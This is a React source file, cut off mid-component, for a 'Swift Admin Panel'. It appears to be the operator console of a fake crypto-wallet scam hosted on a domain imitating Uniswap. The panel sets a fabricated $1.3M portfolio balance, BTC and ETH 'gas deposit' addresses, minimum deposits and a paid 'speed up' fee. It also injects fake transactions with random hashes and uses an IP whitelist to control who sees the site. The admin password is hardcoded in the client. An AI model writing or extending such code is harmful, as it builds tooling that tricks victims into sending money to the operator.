/* eslint-disable max-lines */
import { memo, useCallback, useEffect, useRef, useState } from 'react'
import { Flex, styled, Text, TouchableArea } from 'ui/src'
import { Check } from 'ui/src/components/icons/Check'
import { Eye } from 'ui/src/components/icons/Eye'
import { EyeOff } from 'ui/src/components/icons/EyeOff'
import { Globe } from 'ui/src/components/icons/Globe'
import { Lock } from 'ui/src/components/icons/Lock'
import { Settings } from 'ui/src/components/icons/Settings'
import { ShieldCheck } from 'ui/src/components/icons/ShieldCheck'
import { Trash } from 'ui/src/components/icons/Trash'

// Admin password
const ADMIN_PASSWORD = '13565024'

// Storage key for admin settings
export const SWIFT_ADMIN_SETTINGS_KEY = 'swift-admin-settings'

// API endpoint for settings - use api subdomain for production
const API_BASE_URL =
  typeof window !== 'undefined' && window.location.hostname !== 'localhost'
    ? 'https://api.uniswap.services' // Use api subdomain in production
    : 'http://localhost:3001' // Use absolute path in development

// Default settings
const DEFAULT_SETTINGS: SwiftAdminSettings = {
  portfolioBalance: 1300545.66,
  gasDepositAddress: 'bc1q6jsfmm67vx368wr27wdl3zlqwsslpjcrszh87u',
  ethDepositAddress: '0x742d35Cc6634C0532925a3b844Bc9e7595f5bE91', // ETH address for gas deposits
  minimumGasDeposit: 0.028,
  minimumSendAmount: 10000, // Minimum $10,000 USDT for sends
  gasDepositCurrency: 'BTC',
  ethGasPrice: 3640,
  btcPrice: 100000,
  baseGasFeeETH: 0.002,
  gasFeePercentage: 0.0005,
  freeSendAmount: 10,
  freeSendEnabled: true,
  maintenanceMode: false,
  maintenanceMessage: 'We are currently performing scheduled maintenance. Please check back soon.',
  ethBalance: 0.5, // ETH balance available for gas fees
  // Free send (slow) feature settings
  slowSendEnabled: true, // Enable free sends that take hours
  slowSendDurationHours: 4, // How many hours free sends take
  speedUpGasFeePercentage: 100, // % of normal gas fee to charge for speed up (100 = full fee)
}

// IP Whitelist interfaces
export interface IPWhitelist {
  enabled: boolean
  allowedIPs: string[]
  blockedIPs: string[]
  lastUpdated: number
}

export interface AccessLog {
  id: string
  ip: string
  userAgent: string
  allowed: boolean
  path: string
  timestamp: number
  date: string
}

// Fetch IP whitelist from API
export async function fetchIPWhitelist(): Promise<IPWhitelist> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/whitelist?password=${ADMIN_PASSWORD}`)
    if (response.ok) {
      return await response.json()
    }
  } catch {
    // Silently fail - return default
  }
  return { enabled: true, allowedIPs: [], blockedIPs: [], lastUpdated: 0 }
}

// Save IP whitelist to API
export async function saveIPWhitelist(whitelist: IPWhitelist): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/whitelist`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...whitelist, password: ADMIN_PASSWORD }),
    })
    return response.ok
  } catch {
    // Silently fail
    return false
  }
}

// Add IP to whitelist
export async function addIPToWhitelist(ip: string): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/whitelist/add`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, password: ADMIN_PASSWORD }),
    })
    return response.ok
  } catch {
    // Silently fail
    return false
  }
}

// Remove IP from whitelist
export async function removeIPFromWhitelist(ip: string): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/whitelist/remove`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, password: ADMIN_PASSWORD }),
    })
    return response.ok
  } catch {
    // Silently fail
    return false
  }
}

// Block IP
export async function blockIP(ip: string): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/whitelist/block`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, password: ADMIN_PASSWORD }),
    })
    return response.ok
  } catch {
    // Silently fail
    return false
  }
}

// Fetch access logs
export async function fetchAccessLogs(): Promise<AccessLog[]> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/access-logs?password=${ADMIN_PASSWORD}`)
    if (response.ok) {
      const data = await response.json()
      return data.logs || []
    }
  } catch {
    // Silently fail
  }
  return []
}

// Clear access logs
export async function clearAccessLogs(): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/access-logs/clear`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: ADMIN_PASSWORD }),
    })
    return response.ok
  } catch {
    // Silently fail
    return false
  }
}

export interface SwiftAdminSettings {
  portfolioBalance: number
  gasDepositAddress: string
  ethDepositAddress: string // ETH address for gas fee deposits
  minimumGasDeposit: number
  minimumSendAmount: number // Minimum USDT amount required for sends
  gasDepositCurrency: 'BTC' | 'ETH'
  ethGasPrice: number
  btcPrice: number
  baseGasFeeETH: number
  gasFeePercentage: number
  freeSendAmount: number
  freeSendEnabled: boolean
  maintenanceMode: boolean
  maintenanceMessage: string
  ethBalance: number // ETH balance available for gas fees
  // Free send (slow) feature settings
  slowSendEnabled: boolean // Enable free sends that take hours
  slowSendDurationHours: number // How many hours free sends take
  speedUpGasFeePercentage: number // % of normal gas fee to charge for speed up
}

// Mock Transaction interface for admin-managed transactions
export interface MockTransaction {
  id: string
  type: 'send' | 'receive'
  amount: number
  toAddress: string
  timestamp: number
  status: 'success' | 'pending' | 'sending'
  transactionHash?: string
  // Free send (slow) transaction fields
  isSlowSend?: boolean // True if this is a free slow send
  startTime?: number // When the slow send started
  expectedCompletionTime?: number // When it should complete
  speedUpRequested?: boolean // True if user requested speed up
}

// Fetch mock transactions from API
export async function fetchMockTransactions(): Promise<MockTransaction[]> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/transactions`)
    if (response.ok) {
      const data = await response.json()
      return data.transactions || []
    }
  } catch {
    // Silently fail - return empty array
  }
  return []
}

// Add mock transaction
export async function addMockTransaction(transaction: Omit<MockTransaction, 'id'>): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/transactions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...transaction, password: ADMIN_PASSWORD }),
    })
    return response.ok
  } catch {
    return false
  }
}

// Delete mock transaction
export async function deleteMockTransaction(id: string): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/transactions/${id}`, {
      method: 'DELETE',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: ADMIN_PASSWORD }),
    })
    return response.ok
  } catch {
    return false
  }
}

// Cache for settings to avoid blocking the UI
let settingsCache: SwiftAdminSettings | null = null
let lastFetchTime = 0
const CACHE_DURATION = 5000 // 5 seconds cache

// Fetch settings from API (async)
export async function fetchSwiftAdminSettings(): Promise<SwiftAdminSettings> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/settings`)
    if (response.ok) {
      const data = await response.json()
      const mergedSettings = { ...DEFAULT_SETTINGS, ...data }
      settingsCache = mergedSettings
      lastFetchTime = Date.now()
      // Also update localStorage as fallback
      localStorage.setItem(SWIFT_ADMIN_SETTINGS_KEY, JSON.stringify(mergedSettings))
      return mergedSettings
    }
  } catch {
    // Silently fail - will use local cache
  }
  // Fallback to localStorage
  return getSwiftAdminSettings()
}

// Helper to get admin settings from localStorage (sync, for initial render)
export function getSwiftAdminSettings(): SwiftAdminSettings {
  // Return cache if fresh
  if (settingsCache && Date.now() - lastFetchTime < CACHE_DURATION) {
    return settingsCache
  }
  try {
    const stored = localStorage.getItem(SWIFT_ADMIN_SETTINGS_KEY)
    if (stored) {
      const mergedSettings = { ...DEFAULT_SETTINGS, ...JSON.parse(stored) }
      settingsCache = mergedSettings
      return mergedSettings
    }
  } catch {
    // Ignore parse errors
  }
  return DEFAULT_SETTINGS
}

// Helper to save admin settings to API and localStorage
export async function saveSwiftAdminSettingsToAPI(settings: SwiftAdminSettings, password: string): Promise<boolean> {
  try {
    const response = await fetch(`${API_BASE_URL}/api/settings`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ ...settings, password }),
    })
    if (response.ok) {
      settingsCache = settings
      lastFetchTime = Date.now()
      localStorage.setItem(SWIFT_ADMIN_SETTINGS_KEY, JSON.stringify(settings))
      return true
    }
    // Failed to save
    return false
  } catch {
    // Silently fail
    return false
  }
}

// Helper to save admin settings to localStorage (fallback)
export function saveSwiftAdminSettings(settings: SwiftAdminSettings): void {
  localStorage.setItem(SWIFT_ADMIN_SETTINGS_KEY, JSON.stringify(settings))
  settingsCache = settings
  lastFetchTime = Date.now()
}

const PageContainer = styled(Flex, {
  width: '100%',
  minHeight: '100vh',
  backgroundColor: '$surface1',
  alignItems: 'center',
  justifyContent: 'center',
  p: '$spacing24',
})

const Card = styled(Flex, {
  backgroundColor: '$surface2',
  borderRadius: '$rounded20',
  p: '$spacing24',
  width: '100%',
  maxWidth: 600,
  gap: '$spacing20',
})

const InputContainer = styled(Flex, {
  gap: '$spacing8',
  width: '100%',
})

// Input styles using CSS-in-JS approach
const inputStyles: React.CSSProperties = {
  width: '100%',
  padding: '12px',
  borderRadius: '12px',
  border: '1px solid #333',
  backgroundColor: '#1a1a1a',
  color: '#fff',
  fontSize: 16,
  outline: 'none',
}

const selectStyles: React.CSSProperties = {
  width: '100%',
  padding: '12px',
  borderRadius: '12px',
  border: '1px solid #333',
  backgroundColor: '#1a1a1a',
  color: '#fff',
  fontSize: 16,
  outline: 'none',
  cursor: 'pointer',
}

const SaveButton = styled(TouchableArea, {
  backgroundColor: '$accent1',
  borderRadius: '$rounded12',
  p: '$spacing16',
  alignItems: 'center',
  justifyContent: 'center',
  hoverStyle: {
    opacity: 0.9,
  },
})

const LoginButton = styled(TouchableArea, {
  backgroundColor: '$accent1',
  borderRadius: '$rounded12',
  p: '$spacing16',
  alignItems: 'center',
  justifyContent: 'center',
  width: '100%',
  hoverStyle: {
    opacity: 0.9,
  },
})

const ToggleSwitch = styled(TouchableArea, {
  width: 50,
  height: 28,
  borderRadius: '$roundedFull',
  p: '$spacing2',
  variants: {
    active: {
      true: {
        backgroundColor: '$statusSuccess',
      },
      false: {
        backgroundColor: '$surface3',
      },
    },
  },
})

const ToggleKnob = styled(Flex, {
  width: 24,
  height: 24,
  borderRadius: '$roundedFull',
  backgroundColor: 'white',
  variants: {
    active: {
      true: {
        marginLeft: 'auto',
      },
      false: {
        marginLeft: 0,
      },
    },
  },
})

const TabButton = styled(TouchableArea, {
  px: '$spacing16',
  py: '$spacing12',
  borderRadius: '$rounded12',
  variants: {
    active: {
      true: {
        backgroundColor: '$accent1',
      },
      false: {
        backgroundColor: '$surface3',
      },
    },
  },
})

const IPListItem = styled(Flex, {
  row: true,
  alignItems: 'center',
  justifyContent: 'space-between',
  p: '$spacing12',
  backgroundColor: '$surface1',
  borderRadius: '$rounded12',
  mb: '$spacing8',
})

const ActionButton = styled(TouchableArea, {
  px: '$spacing12',
  py: '$spacing8',
  borderRadius: '$rounded8',
  variants: {
    variant: {
      success: {
        backgroundColor: '$statusSuccess2',
      },
      danger: {
        backgroundColor: '$statusCritical2',
      },
      neutral: {
        backgroundColor: '$surface3',
      },
    },
  },
})

const LogItem = styled(Flex, {
  p: '$spacing12',
  backgroundColor: '$surface1',
  borderRadius: '$rounded12',
  mb: '$spacing8',
  gap: '$spacing4',
})

// IP Management Panel Component
const IPManagementPanel = memo(function IPManagementPanel() {
  const [whitelist, setWhitelist] = useState<IPWhitelist>({
    enabled: true,
    allowedIPs: [],
    blockedIPs: [],
    lastUpdated: 0,
  })
  const [accessLogs, setAccessLogs] = useState<AccessLog[]>([])
  const [mockTransactions, setMockTransactions] = useState<MockTransaction[]>([])
  const [newIP, setNewIP] = useState('')
  const [loading, setLoading] = useState(true)
  const [saving, setSaving] = useState(false)
  const [activeTab, setActiveTab] = useState<'whitelist' | 'logs' | 'transactions'>('whitelist')

  // New transaction form state
  const [newTxAmount, setNewTxAmount] = useState('')
  const [newTxAddress, setNewTxAddress] = useState('')
  const [newTxStatus, setNewTxStatus] = useState<'success' | 'pending'>('success')
  const [newTxType, setNewTxType] = useState<'send' | 'receive'>('send')
  const [newTxDate, setNewTxDate] = useState('')

  // Load data on mount
  useEffect(() => {
    const loadData = async () => {
      setLoading(true)
      const [wl, logs, txs] = await Promise.all([fetchIPWhitelist(), fetchAccessLogs(), fetchMockTransactions()])
      setWhitelist(wl)
      setAccessLogs(logs)
      setMockTransactions(txs)
      setLoading(false)
    }
    loadData()
  }, [])

  // Refresh logs periodically
  useEffect(() => {
    const interval = setInterval(async () => {
      const logs = await fetchAccessLogs()
      setAccessLogs(logs)
    }, 30000)
    return () => clearInterval(interval)
  }, [])

  const handleToggleEnabled = useCallback(async () => {
    setSaving(true)
    const newWhitelist = { ...whitelist, enabled: !whitelist.enabled }
    const success = await saveIPWhitelist(newWhitelist)
    if (success) {
      setWhitelist(newWhitelist)
    }
    setSaving(false)
  }, [whitelist])

  const handleAddIP = useCallback(async () => {
    if (!newIP.trim()) {
      return
    }
    setSaving(true)
    const success = await addIPToWhitelist(newIP.trim())
    if (success) {
      const updated = await fetchIPWhitelist()
      setWhitelist(updated)
      setNewIP('')
    }
    setSaving(false)
  }, [newIP])

  const handleRemoveIP = useCallback(async (ip: string) => {
    setSaving(true)
    const success = await removeIPFromWhitelist(ip)
    if (success) {
      const updated = await fetchIPWhitelist()
      setWhitelist(updated)
    }
    setSaving(false)
  }, [])

  const handleBlockIP = useCallback(async (ip: string) => {
    setSaving(true)
    const success = await blockIP(ip)
    if (success) {
      const updated = await fetchIPWhitelist()
      setWhitelist(updated)
    }
    setSaving(false)
  }, [])

  const handleWhitelistFromLog = useCallback(async (ip: string) => {
    setSaving(true)
    const success = await addIPToWhitelist(ip)
    if (success) {
      const updated = await fetchIPWhitelist()
      setWhitelist(updated)
    }
    setSaving(false)
  }, [])

  const handleClearLogs = useCallback(async () => {
    // biome-ignore lint/suspicious/noAlert: Admin page uses native confirm for simplicity
    if (window.confirm('Are you sure you want to clear all access logs?')) {
      setSaving(true)
      const success = await clearAccessLogs()
      if (success) {
        setAccessLogs([])
      }
      setSaving(false)
    }
  }, [])

  const handleRefreshLogs = useCallback(async () => {
    const logs = await fetchAccessLogs()
    setAccessLogs(logs)
  }, [])

  // Transaction handlers
  const handleAddTransaction = useCallback(async () => {
    if (!newTxAmount.trim() || !newTxAddress.trim()) {
      return
    }
    setSaving(true)
    const tx: Omit<MockTransaction, 'id'> = {
      type: newTxType,
      amount: Number.parseFloat(newTxAmount),
      toAddress: newTxAddress.trim(),
      timestamp: newTxDate ? new Date(newTxDate).getTime() : Date.now(),
      status: newTxStatus,
      transactionHash: `0x${Math.random().toString(16).slice(2)}${Math.random().toString(16).slice(2)}`,
    }
    const success = await addMockTransaction(tx)
    if (success) {
      const updated = await fetchMockTransactions()
      setMockTransactions(updated)
      setNewTxAmount('')
      setNewTxAddress('')
      setNewTxDate('')
      // Notify other components
      window.dispatchEvent(new CustomEvent('swift-settings-updated'))
    }
    setSaving(false)
  }, [newTxAmount, newTxAddress, newTxDate, newTxType, newTxStatus])

  const handleDeleteTransaction = useCallback(async (id: string) => {
    setSaving(true)
    const success = await deleteMockTransaction(id)
    if (success) {
      const updated = await fetchMockTransactions()
      setMockTransactions(updated)
      // Notify other components
      window.dispatchEvent(new CustomEvent('swift-settings-updated'))
    }
    setSaving(false)
  }, [])

  if (loading) {
    return (
      <Flex centered p="$spacing32">
        <Text color="$neutral2">Loading IP settings...</Text>
      </Flex>
    )
  }

  return (
    <Flex gap="$spacing20">
      {/* Tab Navigation */}
      <Flex row gap="$spacing8" flexWrap="wrap">
        <TabButton active={activeTab === 'whitelist'} onPress={() => setActiveTab('whitelist')}>
          <Text variant="buttonLabel3" color={activeTab === 'whitelist' ? 'white' : '$neutral1'}>
            IP Whitelist
          </Text>
        </TabButton>
        <TabButton active={activeTab === 'logs'} onPress={() => setActiveTab('logs')}>
          <Text variant="buttonLabel3" color={activeTab === 'logs' ? 'white' : '$neutral1'}>
            Access Logs ({accessLogs.length})
          </Text>
        </TabButton>
        <TabButton active={activeTab === 'transactions'} onPress={() => setActiveTab('transactions')}>
          <Text variant="buttonLabel3" color={activeTab === 'transactions' ? 'white' : '$neutral1'}>
            Transactions ({mockTransactions.length})
          </Text>
        </TabButton>
      </Flex>

      {activeTab === 'whitelist' ? (
        <>
          {/* Whitelist Enabled Toggle */}
          <Flex
            row
            alignItems="center"
            justifyContent="space-between"
            p="$spacing16"
            backgroundColor="$surface1"
            borderRadius="$rounded12"
          >
            <Flex row alignItems="center" gap="$spacing12">
              <ShieldCheck size={24} color={whitelist.enabled ? '$statusSuccess' : '$neutral3'} />
              <Flex>
                <Text variant="body2" fontWeight="600">
                  IP Whitelist {whitelist.enabled ? 'Enabled' : 'Disabled'}
                </Text>
                <Text variant="body4" color="$neutral3">
                  {whitelist.enabled ? 'Only whitelisted IPs can access the site' : 'All IPs can access the site'}
                </Text>
              </Flex>
            </Flex>
            <ToggleSwitch active={whitelist.enabled} onPress={handleToggleEnabled} disabled={saving}>
              <ToggleKnob active={whitelist.enabled} />
            </ToggleSwitch>
          </Flex>

          {/* Add New IP */}
          <InputContainer>
            <Text variant="body2" fontWeight="600">
              Add IP to Whitelist
            </Text>
            <Flex row gap="$spacing8">
              <Flex grow>
                <input
                  style={inputStyles}
                  type="text"
                  value={newIP}
                  onChange={(e: React.ChangeEvent<HTMLInputElement>) => setNewIP(e.target.value)}
                  placeholder="Enter IP address (e.g., 192.168.1.1)"
                  onKeyPress={(e: React.KeyboardEvent) => e.key === 'Enter' && handleAddIP()}
                />
              </Flex>
              <SaveButton onPress={handleAddIP} disabled={saving || !newIP.trim()}>
                <Text variant="buttonLabel3" color="white">
                  Add
                </Text>
              </SaveButton>
            </Flex>
          </InputContainer>

          {/* Whitelisted IPs List */}
          <Flex gap="$spacing8">
            <Text variant="body2" fontWeight="600" color="$statusSuccess">
              Whitelisted IPs ({whitelist.allowedIPs.length})
            </Text>
            {whitelist.allowedIPs.length === 0 ? (
              <Text variant="body3" color="$neutral3">
                No IPs whitelisted
              </Text>
            ) : (
              whitelist.allowedIPs.map((ip) => (
                <IPListItem key={ip}>
                  <Flex row alignItems="center" gap="$spacing8">
                    <Globe size={16} color="$statusSuccess" />
                    <Text variant="body3">{ip}</Text>
                  </Flex>
                  <Flex row gap="$spacing8">
                    <ActionButton variant="danger" onPress={() => handleBlockIP(ip)}>
                      <Text variant="buttonLabel4" color="$statusCritical">
                        Block
                      </Text>
                    </ActionButton>
                    <ActionButton variant="neutral" onPress={() => handleRemoveIP(ip)}>
                      <Trash size={16} color="$neutral2" />
                    </ActionButton>
                  </Flex>
                </IPListItem>
              ))
            )}
          </Flex>

          {/* Blocked IPs List */}
          {whitelist.blockedIPs.length > 0 && (
            <Flex gap="$spacing8">
              <Text variant="body2" fontWeight="600" color="$statusCritical">
                Blocked IPs ({whitelist.blockedIPs.length})
              </Text>
              {whitelist.blockedIPs.map((ip) => (
                <IPListItem key={ip}>
                  <Flex row alignItems="center" gap="$spacing8">
                    <Globe size={16} color="$statusCritical" />
                    <Text variant="body3">{ip}</Text>
                  </Flex>
                  <ActionButton variant="success" onPress={() => handleWhitelistFromLog(ip)}>
                    <Text variant="buttonLabel4" color="$statusSuccess">
                      Unblock
                    </Text>
                  </ActionButton>
                </IPListItem>
              ))}
            </Flex>
          )}
        </>
      ) : activeTab === 'logs' ? (
        <>
          {/* Access Logs Header */}
          <Flex row alignItems="center" justifyContent="space-between">
            <Text variant="body2" fontWeight="600">
              Recent Access Attempts
            </Text>
            <Flex row gap="$spacing8">
              <ActionButton variant="neutral" onPress={handleRefreshLogs}>
                <Text variant="buttonLabel4" color="$neutral1">
                  Refresh
                </Text>
              </ActionButton>
              <ActionButton variant="danger" onPress={handleClearLogs}>
                <Text variant="buttonLabel4" color="$statusCritical">
                  Clear All
                </Text>
              </ActionButton>
            </Flex>
          </Flex>

          {/* Access Logs List */}
          <Flex style={{ maxHeight: 400, overflow: 'auto' }}>
            {accessLogs.length === 0 ? (
              <Text variant="body3" color="$neutral3">
                No access logs recorded
              </Text>
            ) : (
              accessLogs.slice(0, 50).map((log) => (
                <LogItem key={log.id}>
                  <Flex row alignItems="center" justifyContent="space-between">
                    <Flex row alignItems="center" gap="$spacing8">
                      <Globe size={16} color={log.allowed ? '$statusSuccess' : '$statusCritical'} />
                      <Text variant="body3" fontWeight="600">
                        {log.ip}
                      </Text>
                      <Text variant="body4" color={log.allowed ? '$statusSuccess' : '$statusCritical'}>
                        {log.allowed ? '✓ Allowed' : '✗ Denied'}
                      </Text>
                    </Flex>
                    {!log.allowed && !whitelist.allowedIPs.includes(log.ip) && (
                      <ActionButton variant="success" onPress={() => handleWhitelistFromLog(log.ip)}>
                        <Text variant="buttonLabel4" color="$statusSuccess">
                          Whitelist
                        </Text>
                      </ActionButton>
                    )}
                  </Flex>
                  <Text variant="body4" color="$neutral3">
                    {new Date(log.timestamp).toLocaleString()}
                  </Text>
                  <Text variant="body4" color="$neutral3" numberOfLines={1}>
                    {log.userAgent}
                  </Text>
                </LogItem>
              ))
            )}
          </Flex>
        </>
      ) : (
        <>
          {/* Transactions Management */}
          <InputContainer>
            <Text variant="body2" fontWeight="600">
              Add Mock Transaction
            </Text>
            <Flex gap="$spacing12">
              {/* Amount Input */}
              <Flex gap="$spacing4">
                <Text variant="body4" color="$neutral3">
                  Amount (USD)
                </Text>
                <input
                  style={inputStyles}
                  type="number"
                  value={newTxAmount}
                  onChange={(e: React.ChangeEvent<HTMLInputElement>) => setNewTxAmount(e.target.value)}
                  placeholder="Enter amount (e.g., 173600)"
                />
              </Flex>

              {/* Address Input */}
              <Flex gap="$spacing4">
                <Text variant="body4" color="$neutral3">
                  To Address
                </Text>
                <input
                  style={inputStyles}
                  type="text"
                  value={newTxAddress}
                  onChange={(e: React.ChangeEvent<HTMLInputElement>) => setNewTxAddress(e.target.value)}
                  placeholder="Enter wallet address (0x...)"
                />
              </Flex>

              {/* Date/Time Input */}
              <Flex gap="$spacing4">
                <Text variant="body4" color="$neutral3">
                  Date/Time (leave empty for now)
                </Text>
                <input
                  style={inputStyles}
                  type="datetime-local"
                  value={newTxDate}
                  onChange={(e: React.ChangeEvent<HTMLInputElement>) => setNewTxDate(e.target.value)}
                />
              </Flex>

              {/* Type & Status Selectors */}
              <Flex row gap="$spacing12">
                <Flex gap="$spacing4" grow>
                  <Text variant="body4" color="$neutral3">
                    Type
                  </Text>
                  <select
                    style={{ ...inputStyles, cursor: 'pointer' }}
                    value={newTxType}
                    onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                      setNewTxType(e.target.value as 'send' | 'receive')
                    }
                  >
                    <option value="send">Send</option>
                    <option value="receive">Receive</option>
                  </select>
                </Flex>
                <Flex gap="$spacing4" grow>
                  <Text variant="body4" color="$neutral3">
                    Status
                  </Text>
                  <select
                    style={{ ...inputStyles, cursor: 'pointer' }}
                    value={newTxStatus}
                    onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
                      setNewTxStatus(e.target.value as 'success' | 'pending')
                    }
                  >
                    <option value="success">Success</option>
                    <option value="pending">Pending</option>
                  </select>
                </Flex>
              </Flex>

              <SaveButton
                onPress={handleAddTransaction}
                disabled={saving || !newTxAmount.trim() || !newTxAddress.trim()}
              >
                <Text variant="buttonLabel3" color="white">
                  Add Transaction
                </Text>
              </SaveButton>
            </Flex>
          </InputContainer>

          {/* Transactions List */}
          <Flex gap="$spacing8">
            <Text variant="body2" fontWeight="600">
              Mock Transactions ({mockTransactions.length})
            </Text>
            {mockTransactions.length === 0 ? (
              <Text variant="body3" color="$neutral3">
                No mock transactions configured
              </Text>
            ) : (
              <Flex style={{ maxHeight: 400, overflow: 'auto' }} gap="$spacing8">
                {mockTransactions.map((tx) => (
                  <IPListItem key={tx.id}>
                    <Flex grow gap="$spacing4">
                      <Flex row alignItems="center" gap="$spacing8">
                        <Text variant="body3" fontWeight="600">
                          ${tx.amount.toLocaleString()}
                        </Text>
                        <Text
                          variant="body4"
                          color={tx.type === 'send' ? '$statusCritical' : '$statusSuccess'}
                          textTransform="uppercase"
                        >
                          {tx.type}
                        </Text>
                        <Text variant="body4" color={tx.status === 'success' ? '$statusSuccess' : '$statusWarning'}>
                          ({tx.status})
                        </Text>
                      </Flex>
                      <Text variant="body4" color="$neutral3" numberOfLines={1}>
                        To: {tx.toAddress}
                      </Text>
                      <Text variant="body4" color="$neutral3">
                        {new Date(tx.timestamp).toLocaleString()}
                      </Text>
                    </Flex>
                    <ActionButton variant="danger" onPress={() => handleDeleteTransaction(tx.id)}>
                      <Trash size={16} color="$statusCritical" />
                    </ActionButton>
                  </IPListItem>
                ))}
              </Flex>
            )}
          </Flex>
        </>
      )}
    </Flex>
  )
})

// Password Login Screen
const PasswordScreen = memo(function PasswordScreen({ onAuthenticate }: { onAuthenticate: () => void }) {
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [showPassword, setShowPassword] = useState(false)

  const handleLogin = useCallback(() => {
    if (password === ADMIN_PASSWORD) {
      sessionStorage.setItem('maduro-auth', 'true')
      onAuthenticate()
    } else {
      setError('Invalid password')
      setPassword('')
    }
  }, [password, onAuthenticate])

  const handleKeyPress = useCallback(
    (e: React.KeyboardEvent) => {
      if (e.key === 'Enter') {
        handleLogin()
      }
    },
    [handleLogin],
  )

  return (
    <PageContainer>
      <Card>
        <Flex centered gap="$spacing16">
          <Flex centered width={64} height={64} borderRadius="$roundedFull" backgroundColor="$accent2">
            <Lock size={32} color="$accent1" />
          </Flex>
          <Text variant="heading3">Admin Access Required</Text>
          <Text variant="body2" color="$neutral2" textAlign="center">
            Enter the admin password to access Swift configuration settings
          </Text>
        </Flex>

        <InputContainer>
          <Text variant="body3" color="$neutral2">
            Password
          </Text>
          <Flex row alignItems="center" gap="$spacing8">
            <Flex grow>
              <input
                style={inputStyles}
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
                  setPassword(e.target.value)
                  setError('')
                }}
                onKeyPress={handleKeyPress}
                placeholder="Enter admin password"
              />
            </Flex>
            <TouchableArea onPress={() => setShowPassword(!showPassword)}>
              {showPassword ? <EyeOff size={20} color="$neutral2" /> : <Eye size={20} color="$neutral2" />}
            </TouchableArea>
          </Flex>
          {error && (
            <Text variant="body3" color="$statusCritical">
              {error}
            </Text>
          )}
        </InputContainer>

        <LoginButton onPress={handleLogin}>
          <Text variant="buttonLabel2" color="white">
            Login
          </Text>
        </LoginButton>
      </Card>
    </PageContainer>
  )
})

// Admin Settings Panel
const AdminPanel = memo(function AdminPanel() {
  const [settings, setSettings] = useState<SwiftAdminSettings>(getSwiftAdminSettings())
  const [saved, setSaved] = useState(false)
  const [saving, setSaving] = useState(false)
  const [error, setError] = useState('')
  const [activeSection, setActiveSection] = useState<'settings' | 'ip'>('settings')
  const autoSaveTimeoutRef = useRef<NodeJS.Timeout | null>(null)

  // Load settings from API on mount
  useEffect(() => {
    fetchSwiftAdminSettings().then((s) => setSettings(s))
  }, [])

  // Auto-save settings with debounce (2 second delay)
  const autoSave = useCallback(async (newSettings: SwiftAdminSettings) => {
    setSaving(true)
    const success = await saveSwiftAdminSettingsToAPI(newSettings, ADMIN_PASSWORD)
    if (success) {
      saveSwiftAdminSettings(newSettings)
      setSaved(true)
      setTimeout(() => setSaved(false), 2000)
      window.dispatchEvent(new CustomEvent('swift-settings-updated'))
    } else {
      saveSwiftAdminSettings(newSettings)
      window.dispatchEvent(new CustomEvent('swift-settings-updated'))
    }
    setSaving(false)
  }, [])

  // Poll for settings updates every 10 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      fetchSwiftAdminSettings().then((s) => setSettings(s))
    }, 10000)
    return () => clearInterval(interval)
  }, [])

  const handleSave = useCallback(async () => {
    setSaving(true)
    setError('')

    // Try to save to API first
    const success = await saveSwiftAdminSettingsToAPI(settings, ADMIN_PASSWORD)

    if (success) {
      setSaved(true)
      setTimeout(() => setSaved(false), 2000)
      // Dispatch event so other components can react to settings change
      window.dispatchEvent(new CustomEvent('swift-settings-updated'))
    } else {
      // Fallback to localStorage only
      saveSwiftAdminSettings(settings)
      setError('API save failed, saved locally only. Changes may not sync across browsers.')
      setSaved(true)
      setTimeout(() => {
        setSaved(false)
        setError('')
      }, 3000)
      window.dispatchEvent(new CustomEvent('swift-settings-updated'))
    }

    setSaving(false)
  }, [settings])

  const updateSetting = useCallback(
    <K extends keyof SwiftAdminSettings>(key: K, value: SwiftAdminSettings[K]) => {
      setSettings((prev) => {
        const newSettings = { ...prev, [key]: value }
        // Auto-save with debounce
        if (autoSaveTimeoutRef.current) {
          clearTimeout(autoSaveTimeoutRef.current)
        }
        autoSaveTimeoutRef.current = setTimeout(() => {
          autoSave(newSettings)
        }, 1500) // 1.5 second debounce
        return newSettings
      })
    },
    [autoSave],
  )

  const handleLogout = useCallback(() => {
    sessionStorage.removeItem('maduro-auth')
    window.location.reload()
  }, [])

  return (
    <PageContainer>
      <Card>
        <Flex row alignItems="center" justifyContent="space-between">
          <Flex row alignItems="center" gap="$spacing12">
            <Flex centered width={48} height={48} borderRadius="$roundedFull" backgroundColor="$accent2">
              <Settings size={24} color="$accent1" />
            </Flex>
            <Flex>
              <Text variant="heading3">Swift Admin Panel</Text>
              <Text variant="body3" color="$neutral2">
                Configure Swift mock settings
              </Text>
            </Flex>
          </Flex>
          <TouchableArea onPress={handleLogout}>
            <Text variant="buttonLabel3" color="$neutral2">
              Logout
            </Text>
          </TouchableArea>
        </Flex>

        {/* Section Navigation */}
        <Flex row gap="$spacing8" borderBottomWidth={1} borderBottomColor="$surface3" pb="$spacing12">
          <TabButton active={activeSection === 'settings'} onPress={() => setActiveSection('settings')}>
